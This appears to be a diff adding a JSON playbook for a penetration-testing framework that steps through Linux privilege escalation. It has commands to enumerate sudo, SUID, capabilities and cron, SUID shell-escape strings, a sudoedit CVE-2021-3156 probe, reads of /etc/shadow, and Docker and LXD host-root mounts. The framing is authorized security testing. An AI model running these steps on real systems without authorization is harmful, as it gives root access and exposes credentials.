@@ -1,0 +1,545 @@
+{
+  "id": "linux_privilege_escalation",
+  "name": "Linux Privilege Escalation",
+  "description": "Escalate privileges on Linux systems from low-privileged user to root",
+  "category": "Privilege Escalation",
+  "subcategory": "Linux",
+  "version": "1.0",
+  "author": "Breakout Testing Framework",
+  "tags": ["linux", "privilege-escalation", "root", "sudo"],
+  "triggers": [
+    {
+      "id": "linux_user_access",
+      "name": "Linux User Access",
+      "description": "Trigger when user-level access on Linux system is available",
+      "conditions": {
+        "asset_type": "host",
+        "properties": {
+          "os_family": "linux",
+          "access_level": "user"
+        }
+      }
+    },
+    {
+      "id": "linux_privilege_escalation_unknown",
+      "name": "Linux Privilege Escalation Possibility Unknown",
+      "description": "Trigger when privilege escalation possibility is unknown on Linux",
+      "conditions": {
+        "asset_type": "host",
+        "properties": {
+          "os_family": "linux",
+          "privilege_escalation_possible": ""
+        }
+      }
+    }
+  ],
+  "procedures": [
+    {
+      "id": "system_enumeration",
+      "name": "Linux System Enumeration",
+      "description": "Gather system information for privilege escalation assessment",
+      "order": 1,
+      "riskLevel": "low",
+      "steps": [
+        {
+          "id": "basic_system_info",
+          "name": "Basic System Information",
+          "description": "Collect fundamental Linux system information",
+          "command": "uname -a; cat /etc/os-release; cat /proc/version; hostname; id; pwd; whoami",
+          "expectedOutput": "Kernel version, OS distribution, current user context",
+          "timeout": 30
+        },
+        {
+          "id": "user_enumeration",
+          "name": "User and Group Enumeration",
+          "description": "Enumerate users, groups, and permissions",
+          "command": "cat /etc/passwd; cat /etc/group; groups; who; w; last | head -20",
+          "expectedOutput": "System users, groups, logged-in users, login history",
+          "timeout": 45
+        },
+        {
+          "id": "sudo_privileges",
+          "name": "Sudo Privileges Check",
+          "description": "Check sudo configuration and privileges",
+          "command": "sudo -l; sudo -V; cat /etc/sudoers 2>/dev/null | grep -v '^#'; ls -la /etc/sudoers.d/ 2>/dev/null",
+          "expectedOutput": "Sudo privileges, version, and configuration files",
+          "timeout": 30
+        },
+        {
+          "id": "running_processes",
+          "name": "Running Processes",
+          "description": "List running processes and their owners",
+          "command": "ps aux; ps -ef; top -b -n1 | head -20; pstree -p 2>/dev/null || echo 'pstree not available'",
+          "expectedOutput": "Running processes, process tree, system load",
+          "timeout": 45
+        }
+      ]
+    },
+    {
+      "id": "suid_sgid_enumeration",
+      "name": "SUID/SGID Binary Enumeration",
+      "description": "Find and exploit SUID/SGID binaries",
+      "order": 2,
+      "riskLevel": "medium",
+      "steps": [
+        {
+          "id": "find_suid_binaries",
+          "name": "Find SUID Binaries",
+          "description": "Locate all SUID binaries on the system",
+          "command": "find / -perm -u=s -type f 2>/dev/null; find / -perm -4000 2>/dev/null",
+          "expectedOutput": "List of SUID binaries and their locations",
+          "timeout": 120
+        },
+        {
+          "id": "find_sgid_binaries",
+          "name": "Find SGID Binaries",
+          "description": "Locate all SGID binaries on the system",
+          "command": "find / -perm -g=s -type f 2>/dev/null; find / -perm -2000 2>/dev/null",
+          "expectedOutput": "List of SGID binaries and their locations",
+          "timeout": 120
+        },
+        {
+          "id": "analyze_suid_binaries",
+          "name": "Analyze SUID Binaries",
+          "description": "Check SUID binaries against GTFOBins for exploitation potential",
+          "command": "find / -perm -4000 2>/dev/null | xargs ls -la | grep -E '(find|vim|nano|less|more|tail|head|awk|sed|python|perl|ruby|node|php)'",
+          "expectedOutput": "Potentially exploitable SUID binaries",
+          "timeout": 60
+        },
+        {
+          "id": "test_suid_exploits",
+          "name": "Test SUID Binary Exploits",
+          "description": "Test common SUID binary exploitation techniques",
+          "command": "# Test common SUID exploits\nwhich find && echo 'find SUID test: find . -exec /bin/sh \\; -quit'\nwhich vim && echo 'vim SUID test: vim -c \":!/bin/sh\"'\nwhich python && echo 'python SUID test: python -c \"import os; os.execl(\\\"/bin/sh\\\", \\\"sh\\\", \\\"-p\\\")\"'",
+          "expectedOutput": "Available SUID exploitation vectors",
+          "timeout": 30
+        }
+      ]
+    },
+    {
+      "id": "sudo_exploitation",
+      "name": "Sudo Configuration Exploitation",
+      "description": "Exploit sudo misconfigurations and vulnerabilities",
+      "order": 3,
+      "riskLevel": "high",
+      "steps": [
+        {
+          "id": "sudo_nopasswd_check",
+          "name": "Sudo NOPASSWD Check",
+          "description": "Check for commands that can be run with sudo without password",
+          "command": "sudo -l | grep -i nopasswd; cat /etc/sudoers 2>/dev/null | grep -i nopasswd",
+          "expectedOutput": "Commands available via sudo without password",
+          "timeout": 30
+        },
+        {
+          "id": "sudo_version_check",
+          "name": "Sudo Version Vulnerability Check",
+          "description": "Check sudo version for known vulnerabilities",
+          "command": "sudo --version | head -1; dpkg -l | grep sudo; rpm -qa | grep sudo 2>/dev/null || echo 'RPM not available'",
+          "expectedOutput": "Sudo version and package information",
+          "timeout": 30
+        },
+        {
+          "id": "sudo_cve_2019_14287",
+          "name": "CVE-2019-14287 Sudo Bypass",
+          "description": "Test for CVE-2019-14287 sudo bypass vulnerability",
+          "command": "sudo --version | grep -E '1\\.(8\\.[0-9]|9\\.[0-4])' && echo 'Potentially vulnerable to CVE-2019-14287: sudo -u#-1 command' || echo 'Not vulnerable to CVE-2019-14287'",
+          "expectedOutput": "CVE-2019-14287 vulnerability assessment",
+          "timeout": 15
+        },
+        {
+          "id": "sudo_cve_2021_3156",
+          "name": "CVE-2021-3156 Heap Overflow",
+          "description": "Check for CVE-2021-3156 sudo heap overflow vulnerability",
+          "command": "sudoedit -s '\\' $(python3 -c 'print(\"A\"*1000)') 2>&1 | grep -q 'malloc(): memory corruption' && echo 'Potentially vulnerable to CVE-2021-3156' || echo 'Not vulnerable to CVE-2021-3156'",
+          "expectedOutput": "CVE-2021-3156 vulnerability assessment",
+          "timeout": 30
+        },
+        {
+          "id": "sudo_wildcards",
+          "name": "Sudo Wildcard Exploitation",
+          "description": "Test for sudo wildcard misconfigurations",
+          "command": "sudo -l | grep -E '\\*|ALL' | head -5",
+          "expectedOutput": "Sudo rules with wildcards that may be exploitable",
+          "timeout": 15
+        }
+      ]
+    },
+    {
+      "id": "capabilities_enumeration",
+      "name": "Linux Capabilities Enumeration",
+      "description": "Enumerate and exploit Linux capabilities",
+      "order": 4,
+      "riskLevel": "medium",
+      "steps": [
+        {
+          "id": "check_capabilities",
+          "name": "Check Process Capabilities",
+          "description": "Examine current process capabilities",
+          "command": "capsh --print; cat /proc/self/status | grep Cap; which getcap && getcap -r / 2>/dev/null | head -20 || echo 'getcap not available'",
+          "expectedOutput": "Current capabilities and files with capabilities",
+          "timeout": 60
+        },
+        {
+          "id": "cap_setuid_check",
+          "name": "CAP_SETUID Capability Check",
+          "description": "Check for CAP_SETUID capability exploitation",
+          "command": "capsh --print | grep cap_setuid && echo 'CAP_SETUID available - potential privilege escalation' || echo 'CAP_SETUID not available'",
+          "expectedOutput": "CAP_SETUID capability status",
+          "timeout": 15
+        },
+        {
+          "id": "cap_dac_override_check",
+          "name": "CAP_DAC_OVERRIDE Check",
+          "description": "Test CAP_DAC_OVERRIDE for file access bypass",
+          "command": "capsh --print | grep cap_dac_override && echo 'CAP_DAC_OVERRIDE available - can bypass file permissions' && cat /etc/shadow 2>/dev/null | head -3 || echo 'CAP_DAC_OVERRIDE not available or shadow file protected'",
+          "expectedOutput": "CAP_DAC_OVERRIDE capability and file access test",
+          "timeout": 30
+        },
+        {
+          "id": "cap_sys_admin_check",
+          "name": "CAP_SYS_ADMIN Check",
+          "description": "Check for CAP_SYS_ADMIN capability",
+          "command": "capsh --print | grep cap_sys_admin && echo 'CAP_SYS_ADMIN available - extensive system administration capabilities' || echo 'CAP_SYS_ADMIN not available'",
+          "expectedOutput": "CAP_SYS_ADMIN capability status",
+          "timeout": 15
+        }
+      ]
+    },
+    {
+      "id": "cron_exploitation",
+      "name": "Cron Job Exploitation",
+      "description": "Identify and exploit vulnerable cron jobs",
+      "order": 5,
+      "riskLevel": "medium",
+      "steps": [
+        {
+          "id": "enumerate_cron_jobs",
+          "name": "Enumerate Cron Jobs",
+          "description": "List all cron jobs and their configurations",
+          "command": "cat /etc/crontab; ls -la /etc/cron*; crontab -l 2>/dev/null; ls -la /var/spool/cron/crontabs/ 2>/dev/null",
+          "expectedOutput": "System and user cron jobs",
+          "timeout": 45
+        },
+        {
+          "id": "check_cron_permissions",
+          "name": "Check Cron Script Permissions",
+          "description": "Check permissions on cron scripts and directories",
+          "command": "find /etc/cron* -type f -executable 2>/dev/null | xargs ls -la; find /var/spool/cron -type f 2>/dev/null | xargs ls -la",
+          "expectedOutput": "Cron script permissions and potential write access",
+          "timeout": 60
+        },
+        {
+          "id": "cron_path_hijacking",
+          "name": "Cron PATH Hijacking Check",
+          "description": "Check for PATH manipulation opportunities in cron",
+          "command": "cat /etc/crontab | grep PATH; grep -r PATH /etc/cron* 2>/dev/null | head -10",
+          "expectedOutput": "PATH configurations in cron that may be exploitable",
+          "timeout": 30
+        },
+        {
+          "id": "writable_cron_dirs",
+          "name": "Writable Cron Directories",
+          "description": "Find writable directories in cron paths",
+          "command": "find /etc/cron* -type d -writable 2>/dev/null; find /var/spool/cron -type d -writable 2>/dev/null",
+          "expectedOutput": "Writable cron directories for potential exploitation",
+          "timeout": 30
+        }
+      ]
+    },
+    {
+      "id": "file_permissions",
+      "name": "File Permission Exploitation",
+      "description": "Exploit weak file and directory permissions",
+      "order": 6,
+      "riskLevel": "medium",
+      "steps": [
+        {
+          "id": "world_writable_files",
+          "name": "World Writable Files",
+          "description": "Find world-writable files and directories",
+          "command": "find / -writable -type d 2>/dev/null | head -20; find / -writable -type f 2>/dev/null | head -20; find / -perm -222 -type f 2>/dev/null | head -10",
+          "expectedOutput": "World-writable files and directories",
+          "timeout": 120
+        },
+        {
+          "id": "sensitive_file_permissions",
+          "name": "Sensitive File Permissions",
+          "description": "Check permissions on sensitive system files",
+          "command": "ls -la /etc/passwd /etc/shadow /etc/group /etc/sudoers; ls -la /etc/ssh/sshd_config /etc/ssh/ssh_host_*key*",
+          "expectedOutput": "Permissions on critical system files",
+          "timeout": 30
+        },
+        {
+          "id": "backup_files",
+          "name": "Backup Files Search",
+          "description": "Search for backup files that may contain sensitive information",
+          "command": "find / -name '*.bak' -o -name '*.backup' -o -name '*.old' -o -name '*~' 2>/dev/null | head -20; find /home -name '.bash_history' 2>/dev/null | head -10",
+          "expectedOutput": "Backup files and shell history files",
+          "timeout": 60
+        },
+        {
+          "id": "config_files",
+          "name": "Configuration Files Search",
+          "description": "Search for configuration files with potential credentials",
+          "command": "find / -name '*.conf' -o -name '*.config' -o -name '*.cfg' 2>/dev/null | head -20; grep -r 'password' /etc 2>/dev/null | head -10",
+          "expectedOutput": "Configuration files and potential password references",
+          "timeout": 90
+        }
+      ]
+    },
+    {
+      "id": "kernel_exploitation",
+      "name": "Kernel Exploitation",
+      "description": "Identify and exploit kernel vulnerabilities",
+      "order": 7,
+      "riskLevel": "critical",
+      "steps": [
+        {
+          "id": "kernel_version_check",
+          "name": "Kernel Version Check",
+          "description": "Check kernel version for known vulnerabilities",
+          "command": "uname -r; cat /proc/version; cat /etc/os-release | grep VERSION",
+          "expectedOutput": "Kernel version and OS release information",
+          "timeout": 15
+        },
+        {
+          "id": "dirty_cow_check",
+          "name": "DirtyCOW Vulnerability Check",
+          "description": "Check for DirtyCOW vulnerability (CVE-2016-5195)",
+          "command": "uname -r | grep -E '(2\\.6\\.|3\\.|4\\.[0-8]\\.)' && echo 'Potentially vulnerable to DirtyCOW (CVE-2016-5195)' || echo 'Likely patched against DirtyCOW'",
+          "expectedOutput": "DirtyCOW vulnerability assessment",
+          "timeout": 15
+        },
+        {
+          "id": "dirty_pipe_check",
+          "name": "DirtyPipe Vulnerability Check",
+          "description": "Check for DirtyPipe vulnerability (CVE-2022-0847)",
+          "command": "uname -r | grep -E '(5\\.(8|9|10|11|12|13|14|15|16)\\.)' && echo 'Potentially vulnerable to DirtyPipe (CVE-2022-0847)' || echo 'Likely not vulnerable to DirtyPipe'",
+          "expectedOutput": "DirtyPipe vulnerability assessment",
+          "timeout": 15
+        },
+        {
+          "id": "pwnkit_check",
+          "name": "PwnKit Vulnerability Check",
+          "description": "Check for PwnKit vulnerability (CVE-2021-4034)",
+          "command": "ls -la /usr/bin/pkexec; pkexec --version 2>/dev/null | head -1 && echo 'pkexec present - check for CVE-2021-4034' || echo 'pkexec not found'",
+          "expectedOutput": "PwnKit vulnerability components",
+          "timeout": 15
+        },
+        {
+          "id": "compiler_check",
+          "name": "Compiler Availability Check",
+          "description": "Check for available compilers to compile exploits",
+          "command": "which gcc; which cc; which g++; which make; which python3; which perl",
+          "expectedOutput": "Available compilers and interpreters",
+          "timeout": 15
+        }
+      ]
+    },
+    {
+      "id": "docker_group_exploitation",
+      "name": "Docker Group Exploitation",
+      "description": "Exploit Docker group membership for privilege escalation",
+      "order": 8,
+      "riskLevel": "high",
+      "steps": [
+        {
+          "id": "check_docker_group",
+          "name": "Check Docker Group Membership",
+          "description": "Verify if current user is in docker group",
+          "command": "groups | grep docker; id | grep docker; ls -la /var/run/docker.sock",
+          "expectedOutput": "Docker group membership and socket access",
+          "timeout": 15
+        },
+        {
+          "id": "docker_escape_test",
+          "name": "Docker Escape Test",
+          "description": "Test Docker-based privilege escalation",
+          "command": "docker --version 2>/dev/null && echo 'Docker available for privilege escalation'; docker images 2>/dev/null | head -5",
+          "expectedOutput": "Docker availability and available images",
+          "timeout": 30
+        },
+        {
+          "id": "docker_privilege_escalation",
+          "name": "Docker Privilege Escalation",
+          "description": "Execute privilege escalation via Docker",
+          "command": "docker run -it -v /:/host --privileged alpine chroot /host bash -c 'echo Docker privilege escalation test; id; hostname' 2>/dev/null || echo 'Docker privilege escalation failed or restricted'",
+          "expectedOutput": "Docker-based root access test",
+          "timeout": 60
+        }
+      ]
+    },
+    {
+      "id": "lxd_group_exploitation",
+      "name": "LXD Group Exploitation",
+      "description": "Exploit LXD group membership for privilege escalation",
+      "order": 9,
+      "riskLevel": "high",
+      "steps": [
+        {
+          "id": "check_lxd_group",
+          "name": "Check LXD Group Membership",
+          "description": "Verify if current user is in lxd group",
+          "command": "groups | grep lxd; id | grep lxd; which lxc",
+          "expectedOutput": "LXD group membership and lxc client availability",
+          "timeout": 15
+        },
+        {
+          "id": "lxd_images_check",
+          "name": "LXD Images Check",
+          "description": "Check available LXD images for container creation",
+          "command": "lxc image list 2>/dev/null | head -10; lxc list 2>/dev/null",
+          "expectedOutput": "Available LXD images and containers",
+          "timeout": 30
+        },
+        {
+          "id": "lxd_privilege_escalation",
+          "name": "LXD Privilege Escalation",
+          "description": "Execute privilege escalation via LXD container",
+          "command": "lxc init ubuntu:18.04 test -c security.privileged=true 2>/dev/null && lxc config device add test host-root disk source=/ path=/mnt/root recursive=true 2>/dev/null && echo 'LXD container prepared for privilege escalation' || echo 'LXD privilege escalation setup failed'",
+          "expectedOutput": "LXD-based privilege escalation setup",
+          "timeout": 60
+        }
+      ]
+    }
+  ],
+  "risks": [
+    {
+      "risk": "SUID binary exploitation may affect system stability",
+      "mitigation": "Test SUID exploits carefully and avoid critical system binaries"
+    },
+    {
+      "risk": "Sudo exploitation may lock out legitimate users",
+      "mitigation": "Document sudo modifications and test in non-production environment"
+    },
+    {
+      "risk": "Kernel exploits may cause system crashes",
+      "mitigation": "Use kernel exploits only with explicit approval and system backups"
+    },
+    {
+      "risk": "Docker/LXD exploitation may affect containerized services",
+      "mitigation": "Coordinate with system administrators before container-based escalation"
+    },
+    {
+      "risk": "File permission changes may disrupt applications",
+      "mitigation": "Document file permission modifications for restoration"
+    },
+    {
+      "risk": "Cron job modifications may affect scheduled tasks",
+      "mitigation": "Backup cron configurations before making changes"
+    }
+  ],
+  "tools": [
+    {
+      "name": "LinPEAS",
+      "version": "Latest",
+      "required": false,
+      "purpose": "Automated Linux privilege escalation enumeration"
+    },
+    {
+      "name": "LinEnum",
+      "version": "Latest",
+      "required": false,
+      "purpose": "Linux enumeration script"
+    },
+    {
+      "name": "GTFOBins",
+      "version": "Reference",
+      "required": false,
+      "purpose": "Unix binary exploitation reference"
+    },
+    {
+      "name": "Exploit Compilers",
+      "version": "Various",
+      "required": false,
+      "purpose": "Compile kernel and privilege escalation exploits"
+    },
+    {
+      "name": "Docker/LXD",
+      "version": "Any",
+      "required": false,
+      "purpose": "Container-based privilege escalation"
+    }
+  ],
+  "equipment": [
+    {
+      "name": "Linux System Access",
+      "required": true,
+      "description": "User-level shell access to Linux system"
+    },
+    {
+      "name": "Command Line Tools",
+      "required": true,
+      "description": "Basic Unix/Linux command line utilities"
+    }
+  ],
+  "suggestedFindings": [
+    {
+      "title": "Linux System Information Gathered",
+      "description": "Successfully enumerated Linux system configuration and user context",
+      "severity": "informational",
+      "evidence": "Kernel version, OS distribution, user privileges, running processes"
+    },
+    {
+      "title": "Exploitable SUID/SGID Binaries",
+      "description": "Identified SUID/SGID binaries that can be exploited for privilege escalation",
+      "severity": "high",
+      "evidence": "SUID binary listings, GTFOBins references, exploitation commands"
+    },
+    {
+      "title": "Sudo Misconfigurations",
+      "description": "Found sudo configuration weaknesses enabling privilege escalation",
+      "severity": "high",
+      "evidence": "Sudo rules, NOPASSWD entries, wildcard configurations"
+    },
+    {
+      "title": "Sudo Vulnerability Exposure",
+      "description": "System vulnerable to known sudo exploits (CVE-2019-14287, CVE-2021-3156)",
+      "severity": "critical",
+      "evidence": "Sudo version, vulnerability tests, exploit feasibility"
+    },
+    {
+      "title": "Dangerous Linux Capabilities",
+      "description": "Process or files have excessive Linux capabilities",
+      "severity": "medium",
+      "evidence": "Capability enumeration, CAP_SETUID/CAP_DAC_OVERRIDE tests"
+    },
+    {
+      "title": "Vulnerable Cron Jobs",
+      "description": "Identified cron jobs with weak permissions or PATH hijacking opportunities",
+      "severity": "medium",
+      "evidence": "Cron job listings, script permissions, PATH configurations"
+    },
+    {
+      "title": "Weak File Permissions",
+      "description": "Found sensitive files or directories with excessive permissions",
+      "severity": "medium",
+      "evidence": "World-writable files, sensitive file permissions, configuration files"
+    },
+    {
+      "title": "Kernel Vulnerability Exposure",
+      "description": "Linux kernel vulnerable to known privilege escalation exploits",
+      "severity": "critical",
+      "evidence": "Kernel version, DirtyCOW/DirtyPipe/PwnKit vulnerability assessment"
+    },
+    {
+      "title": "Docker Group Privilege Escalation",
+      "description": "User in docker group enabling container-based privilege escalation",
+      "severity": "high",
+      "evidence": "Docker group membership, container creation, host filesystem access"
+    },
+    {
+      "title": "LXD Group Privilege Escalation",
+      "description": "User in lxd group enabling LXD container-based privilege escalation",
+      "severity": "high",
+      "evidence": "LXD group membership, container configuration, privileged access"
+    },
+    {
+      "title": "Root Access Achieved",
+      "description": "Successfully escalated privileges to root level access",
+      "severity": "critical",
+      "evidence": "Root shell access, elevated command execution, system administration capabilities"
+    }
+  ]
+}
